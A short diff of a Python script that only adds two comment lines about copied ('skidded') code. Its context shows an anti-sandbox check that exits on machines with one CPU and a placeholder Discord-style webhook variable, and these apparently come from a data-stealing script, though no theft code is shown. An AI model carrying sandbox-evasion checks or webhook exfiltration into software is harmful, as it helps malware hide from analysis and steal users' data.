@@ -300,7 +300,7 @@ def check_specs():
 
     if int(cpu_count()) <= 1: exit_program('Cpu Counts Invalid')
 
-
+############### skidded the following part bc im stupid and didnt pay for my python courses ###############
 
 try:        
 
@@ -335,7 +335,7 @@ try:
 except:
 
     pass
-
+######### end of skidding ##########
 
 
 webhook = ("webhooker")
